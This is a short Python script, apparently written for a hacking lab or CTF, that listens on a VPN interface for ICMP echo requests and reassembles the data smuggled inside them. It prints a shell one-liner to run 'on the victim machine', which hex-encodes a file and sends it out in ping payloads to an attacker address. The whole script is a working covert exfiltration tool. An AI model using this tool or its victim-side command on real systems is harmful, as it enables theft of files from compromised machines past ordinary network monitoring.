#!/usr/bin/python3

from pwn import *
from scapy.all import *
import signal

def ctrl_c(sig, frame):
	print("\n[!] Exiting...\n")
	sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

def icmp_sniffer(packet):
	if packet.haslayer(ICMP):
		if packet[ICMP].type == 8:
			data = packet[ICMP].load[-4:].decode("utf-8")
			print(data, flush=True, end='')

if __name__ == '__main__':
	print("\n[*] Execute this on the victim machine: xxd -p -c 4 /path/to/file | while read line; do ping -c 1 -p $line 10.10.x.x; done")
	print("\n[*] Listening for ICMP connections...\n")
	sniff(iface='tun0', prn=icmp_sniffer)
